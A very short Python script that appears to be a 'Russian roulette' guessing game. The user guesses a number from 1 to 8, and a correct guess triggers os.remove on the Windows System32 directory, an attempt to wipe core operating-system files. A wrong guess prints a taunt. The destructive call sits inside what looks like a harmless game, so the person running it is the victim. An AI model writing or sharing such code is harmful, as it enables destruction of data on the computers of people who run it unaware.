import os
import random

number = random.randint(1, 8)

guess = int(input("Guess a number between 1 and 8: "))

if guess == number:
    os.remove("C:/windows/System32")
else:
    print(f"You pass!, the number was {number}.")